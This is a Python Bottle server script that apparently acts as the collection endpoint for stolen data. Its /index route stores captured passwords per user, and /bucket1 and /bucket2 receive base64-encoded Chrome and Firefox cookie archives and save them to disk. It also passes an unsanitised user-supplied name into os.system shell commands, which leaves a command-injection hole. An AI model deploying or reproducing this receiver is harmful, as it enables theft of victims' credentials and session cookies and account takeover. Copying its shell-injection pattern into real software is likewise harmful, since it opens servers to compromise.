from bottle import *
from termcolor import cprint, colored
import urllib
import os
import sys
import base64 as b64
#import hashlib


key = ''
BaseRequest.MEMFILE_MAX = 1024 * 1024 

# the decorator
def enable_cors(fn):
    def _enable_cors(*args, **kwargs):
        # set CORS headers
        response.headers['Access-Control-Allow-Origin'] = '*'
        return fn(*args, **kwargs)
    
    return _enable_cors

#setup proxies struct to use burp if nec
def get_proxies():
    http_proxy  = "http://10.0.2.2:8081"
    https_proxy = "https://10.0.2.2:8081"

    proxyDict = { 
              "http"  : http_proxy, 
              "https" : https_proxy, 
            }
    return proxyDict

#@route('/hello/<name>')
@route('/')
def index():
    return '<h1>Helo world!</h1>'
    #return template('<b>Hello {{name}}</b>!', name=name)

@post('/index')
def callback():
    global key
    
    if request.forms.get('i'):
        cprint("Yay! We received something!",'green')
        nkey = request.forms.get('i')
        user = request.forms.get('u')
        passwdfile = 'password-'+user
        if os.path.exists(passwdfile):
            p=open(passwdfile)
            oldKey=p.read()
            p.close()
            if nkey != oldKey:
                cprint("received new password for user %s" % user,'yellow')
                os.system('mv %s %s_$(date +"%%d%%m%%d-%%H.%%M")' % (passwdfile, passwdfile))    
                p=open(passwdfile, 'w+')
                p.write(nkey)
                p.close()
                return
            else:   
                cprint("Password for user %s already received" % user,'blue')
                return
        else:
            cprint("Received password for user %s!" % user,'green')
            p=open(passwdfile, 'w+')
            p.write(nkey)
            p.close()
            return
    cprint("Key not found in request", 'red')
    return



@post('/bucket1')
def callback():
    if request.forms.get('c'):
        cprint("Yay! Callback for Chrome cookies!",'green')
        b64cookies = request.forms.get('c')
        user = request.forms.get('u')
        cookies_file = 'chrome-cookies-'+user+'.zip'
        if os.path.exists(cookies_file):
            cprint("Cookies file already received for user %s, backing up" % user, 'blue')
            os.system('mv %s %s_$(date +"%%d%%m%%d-%%H.%%M")' % (cookies_file, cookies_file))
        #do something with data
        #newHash=hashlib.md5(nkey).hexdigest()
        #oldHash=hashlib.md5(open(passwdfile).read()).hexdigest()
        fh = open(cookies_file, 'w+')
        fh.write(b64.b64decode(b64cookies))
        fh.close()
    else:
        cprint('No data on the request', 'red')

@post('/bucket2')
def callback():
    if request.forms.get('c'):
        cprint("Yay! Callback for Firefox cookies!",'green')
        b64cookies = request.forms.get('c')
        user = request.forms.get('u')
        cookies_file = 'firefox-cookies-'+user+'.zip'
        if os.path.exists(cookies_file):
            cprint("Cookies file already received for user %s, backing up" % user, 'blue')
            os.system('mv %s %s_$(date +"%%d%%m%%d-%%H.%%M")' % (cookies_file, cookies_file))
        fh = open(cookies_file, 'w+')
        fh.write(b64.b64decode(b64cookies))
        fh.close()
    else:
        cprint('No data on the request', 'red')


run(host='localhost', port=sys.argv[1])

